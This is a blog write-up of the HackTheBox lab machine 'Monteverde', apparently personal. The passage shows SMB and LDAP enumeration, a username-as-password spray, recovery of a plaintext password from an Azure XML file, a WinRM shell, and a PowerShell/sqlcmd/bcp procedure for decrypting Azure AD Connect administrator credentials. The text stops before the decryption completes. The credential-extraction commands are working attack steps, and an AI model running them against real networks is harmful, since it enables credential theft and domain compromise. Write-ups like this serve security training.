---
layout: post
title: "HTB: Monteverde"
tags: htb windows
---

Monteverde was a medium-level Windows box on HackTheBox that _imo_... probably should have been "easy". Let's see why.

### Recon

Starting with initial nmap scan, at first glance we see a bunch of ports:
```
Discovered open port 445/tcp on 10.10.10.172
Discovered open port 53/tcp on 10.10.10.172
Discovered open port 135/tcp on 10.10.10.172
Discovered open port 139/tcp on 10.10.10.172
Discovered open port 3269/tcp on 10.10.10.172
Discovered open port 464/tcp on 10.10.10.172
Discovered open port 88/tcp on 10.10.10.172
Discovered open port 3268/tcp on 10.10.10.172
Discovered open port 389/tcp on 10.10.10.172
Discovered open port 593/tcp on 10.10.10.172                                                                                   
Discovered open port 636/tcp on 10.10.10.172 
```
We do an `-sC` and `-sV` on the ports and see the following:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-10 13:24:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/10%Time=5E6792C1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```
We observe the following:
- domain: `MEGABANK.LOCAL0.`
- there's SMB (445/139), Kerberos (88) and LDAP (3268).
  
  
As is usually the case with Windows boxes I'll start with SMB and try to find accessible shares and some usernames. My go-to tool is usually `enum4linux`, so let's see the output:
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Mar 10 10:48:31 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... monteverde.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on monteverde.htb    |
 ====================================================== 
[E] Can't find workgroup/domain


 ============================================== 
|    Nbtstat Information for monteverde.htb    |
 ============================================== 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ======================================= 
|    Session Check on monteverde.htb    |
 ======================================= 
[+] Server monteverde.htb allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 ============================================= 
|    Getting domain SID for monteverde.htb    |
 ============================================= 
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ======================================== 
|    OS information on monteverde.htb    |
 ======================================== 
[+] Got OS info for monteverde.htb from smbclient: 
[+] Got OS info for monteverde.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 =============================== 
|    Users on monteverde.htb    |
 =============================== 
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 =========================================== 
|    Share Enumeration on monteverde.htb    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on monteverde.htb

 ====================================================== 
|    Password Policy Information for monteverde.htb    |
 ====================================================== 


[+] Attaching to monteverde.htb using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ================================ 
|    Groups on monteverde.htb    |
 ================================ 

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Group 'RDS Endpoint Servers' (RID: 576) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator

 ========================================================================= 
|    Users on monteverde.htb via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =============================================== 
|    Getting printer info for monteverde.htb    |
 =============================================== 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Mar 10 10:59:08 2020
```

Awesome - so we find a few usernames. Let's store the `enum4linux` results in a file called `enum.txt` and collect the usernames with this command:
```
cat enum.txt | grep member | grep MEGABANK | cut -d'\' -f2 > users.txt
```
```
Guest
dgalanos
smorgan
Administrator
krbtgt
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
Administrator
AAD_987d7f2f57d2
mhope
roleary
Administrator
```
At this point, we have usernames, but no passwords. We could use these usernames and try to brute-force for passwords, but before we do that, let's try and see if some of the users adopted _lazy_ security practices such as [_using their usernames as passwords_](https://wiki.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)#Testing_for_default_credentials_of_common_applications).
  
  
To do this, we can do a loop that passes the username in both the `username` and `password` field when authenticating via `smbclient`:
```
for i in $(cat users.txt);do echo "[+] $i" && smbclient -L monteverde.htb -U $i%$i;done
```
```
[+] Guest
session setup failed: NT_STATUS_LOGON_FAILURE
[+] dgalanos
session setup failed: NT_STATUS_LOGON_FAILURE
[+] smorgan
session setup failed: NT_STATUS_LOGON_FAILURE
[+] Administrator
session setup failed: NT_STATUS_LOGON_FAILURE
[+] krbtgt
session setup failed: NT_STATUS_LOGON_FAILURE
[+] AAD_987d7f2f57d2
session setup failed: NT_STATUS_LOGON_FAILURE
[+] mhope
session setup failed: NT_STATUS_LOGON_FAILURE
[+] SABatchJobs

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      
SMB1 disabled -- no workgroup available
[+] svc-ata
session setup failed: NT_STATUS_LOGON_FAILURE
[+] svc-bexec
session setup failed: NT_STATUS_LOGON_FAILURE
[+] svc-netapp
session setup failed: NT_STATUS_LOGON_FAILURE
[+] dgalanos
session setup failed: NT_STATUS_LOGON_FAILURE
[+] roleary
session setup failed: NT_STATUS_LOGON_FAILURE
[+] smorgan
session setup failed: NT_STATUS_LOGON_FAILURE
[+] Administrator
session setup failed: NT_STATUS_LOGON_FAILURE
[+] AAD_987d7f2f57d2
session setup failed: NT_STATUS_LOGON_FAILURE
[+] mhope
session setup failed: NT_STATUS_LOGON_FAILURE
[+] roleary
session setup failed: NT_STATUS_LOGON_FAILURE
[+] Administrator
session setup failed: NT_STATUS_LOGON_FAILURE
```
Looks like we got one lazy user! `SABatchJobs` logs in with `SABatchJobs`. Let's take a closer look with `smbmap`:
```
kali@kali:~/htb/boxes/monteverde/enum4linux$ smbmap -H monteverde.htb -u'SABatchJobs' -p'SABatchJobs'
[+] IP: monteverde.htb:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
```
We've got a few readable shares in `azure_uploads` and `users$`. Let's do a recursive search on both with the `-R` option on `smbmap`:
```
kali@kali:~/htb/boxes/monteverde/enum4linux$ smbmap -H monteverde.htb -u'SABatchJobs' -p'SABatchJobs' -R"azure_uploads"
[+] IP: monteverde.htb:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        azure_uploads                                           READ ONLY
        .\azure_uploads\*
        dr--r--r--                0 Fri Jan  3 04:43:36 2020    .
        dr--r--r--                0 Fri Jan  3 04:43:36 2020    ..
```
```
kali@kali:~/htb/boxes/monteverde/enum4linux$ smbmap -H monteverde.htb -u'SABatchJobs' -p'SABatchJobs' -R"users$"
[+] IP: monteverde.htb:445      Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        users$                                                  READ ONLY
        .\users$\*
        dr--r--r--                0 Fri Jan  3 05:12:48 2020    .
        dr--r--r--                0 Fri Jan  3 05:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 05:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 05:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 05:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 05:14:28 2020    smorgan
        .\users$\mhope\*
        dr--r--r--                0 Fri Jan  3 05:41:18 2020    .
        dr--r--r--                0 Fri Jan  3 05:41:18 2020    ..
        fw--w--w--             1212 Fri Jan  3 06:59:24 2020    azure.xml
```
Looks like we have only one readable file in `azure.xml` in the `users$` share in the `mhope` folder. Let's get that file and take a look - we can do this fast with a single `smbget` command:
```
kali@kali:~/htb/boxes/monteverde/enum4linux$ smbget smb://monteverde.htb/users$/mhope/azure.xml -U SABatchJobs%SABatchJobs
Using workgroup WORKGROUP, user SABatchJobs
smb://monteverde.htb/users$/mhope/azure.xml                                                                                                        
Downloaded 1.18kB in 5 seconds
```
```
kali@kali:~/htb/boxes/monteverde/enum4linux$ cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
All right! Looks like we got `mhope`'s credentials. That wasn't so hard was it??? Let's keep going.
```
mhope
4n0therD4y@n0th3r$
```

### Shell as mhope
If you had done an all-ports scan on nmap, you should have seen this port:
```
Discovered open port 5985/tcp on 10.10.10.172
```
That's the default port for Windows Remote Management - so now that we have `mhope`'s credentials, let's try logging via WinRM using `evil-winrm`:
```
kali@kali:~/htb/boxes/monteverde/nmap$ evil-winrm -i monteverde.htb -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents>
```
Grab user.txt here.
  
  
From here on we could run an enumeration script like `WinPEAS` to find an escalation route, but it's actually pretty straightforward for this box. First we check `mhope`'s privileges with a `net user` command:
```
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   6/14/2020 7:11:52 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```
We see something interesting - `mhope` is part of the `Azure Admins` group. If we Google for privilege escalation techiques related to `Azure Admins`, you [should come across this article](https://blog.xpnsec.com/azuread-connect-for-redteam/), which also contains an exploit POC.
   
   
To sum the article up, to escalate our privleges, the POC basically helps us to do the following steps:
1. Get the contents of `keyset_id, instance_id, entropy` from `mms_server_configuration`
2. Store them respectively in the following variables:
```
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
```
3. Then, get the contents of `private_configuration_xml, encrypted_configuration` from `mms_management_agent`
4. Store them respectively in the following variables:
```
$config
$crypted
```
5. Do the following:
```
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```
6. Then do the next following:
```
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
```
7. After that, print the output:
```
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
Then basically boom! We'll get the credentials we want. Now we could simply run the script on the box, but you'd soon find that that wouldn't work. The good news is, we can do it manually!
  
  
First we start by manually extracting the contents of `private_configuration_xml, encrypted_configuration`. The article describes how to do that here:
<img src="https://raw.githubusercontent.com/ongyuann/ongyuann.github.io/master/images/2020-06-14-monteverde-clue.png" alt="say what?" class="inline"/>
  
  
Let's follow the article and enter the directory at `C:\Program Files\Microsoft SQL Server\110\Tools\Binn`:
```
*Evil-WinRM* PS C:\Users\mhope\Desktop> cd "C:\Program Files\Microsoft SQL Server\110\Tools\Binn"
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> dir


    Directory: C:\Program Files\Microsoft SQL Server\110\Tools\Binn


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:53 PM                Resources
-a----        8/15/2017   9:31 PM         177856 batchparser.dll
-a----        8/15/2017   9:31 PM         115392 bcp.exe
-a----        2/11/2012   9:53 AM         259672 SQLCMD.EXE
-a----        8/15/2017   9:56 PM         278216 xmlrw.dll
```
All right, so we've got the same program `SQLCMD.EXE` as described in the article. Let's see if we can follow the POC and use `SQLCMD.exe` to extract `keyset_id, instance_id, entropy` for Step 1:
```
sqlcmd.exe -d ADSync -q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
```
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> sqlcmd.exe -d ADSync -q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
```
Yes, we can - Step 1 completed. Let's do Step 2 and store them in the variables:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key_id = 1
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $instance_id = "1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $entropy = "194EC2FC-F186-46CF-B44D-071EB61F49CD"
```
Now we've got the first 3 variables. Let's continue with Step 3:
```
sqlcmd.exe -d ADSync -q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
```
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> sqlcmd.exe -d ADSync -q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(1 rows affected)
```
Interesting - we nearly got the `administrator`'s encrypted password! But due to some column limitations of `SQLCMD.EXE`, our information is cut short and we can't get the full encrypted password. At this juncture I explored many options available to `SQLCMD.EXE` to try and expand the columns, but those attempts failed. What worked, in the end, was using the `bcp.exe` program.

### bcp.exe to the rescue

What is `bcp.exe`? I don't know. But I [sure as hell learned how to use it](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/0ca4153f-2a16-4bca-8458-874c1bf7e06d/bcp-query-out-format?forum=transactsql). For our case, we can now extract the full contents of `private_configuration_xml` like this:
```
bcp.exe "SELECT private_configuration_xml FROM mms_management_agent WHERE ma_type = 'AD'" queryout "C:\users\mhope\documents\out.txt" -d ADSync -T -c
```
Notice the `queryout` option -> we need this because the output is going to be too big for our WinRM window. Let's run it:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> bcp.exe "SELECT private_configuration_xml FROM mms_management_agent WHERE ma_type = 'AD'" queryout "C:\users\mhope\documents\out.txt" -d ADSync -T -c

Starting copy...

1 rows copied.
Network packet size (bytes): 4096
Clock Time (ms.) Total     : 15     Average : (66.67 rows per sec.)
```
Read the output:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> type c:\users\mhope\documents\out.txt
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
</parameter-values>
 <password-hash-sync-config>
            <enabled>1</enabled>
            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
         </password-hash-sync-config>
</adma-configuration>
```
Now we do the same for `encrypted_configuration`:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> bcp.exe "SELECT encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" queryout "C:\users\mhope\documents\out2.txt" -d ADSync -T -c

Starting copy...

1 rows copied.
Network packet size (bytes): 4096
Clock Time (ms.) Total     : 1      Average : (1000.00 rows per sec.)
```
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> type c:\users\mhope\documents\out2.txt
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
```
Step 3 completed, let's follow through with Step 4 - we can [store the contents of the files into the PowerShell variables](https://stackoverflow.com/questions/7976646/powershell-store-entire-text-file-contents-in-variable) `$config` and `$crypted` like this:
```
$config = [IO.File]::ReadAllText("C:\users\mhope\documents\out.txt")
$crypted = [IO.File]::ReadAllText("C:\users\mhope\documents\out2.txt")
```
So let's do it:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $config = [IO.File]::ReadAllText("C:\users\mhope\documents\out.txt")
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $crypted = [IO.File]::ReadAllText("C:\users\mhope\documents\out2.txt")
```
Check `$config`:
```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $config
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
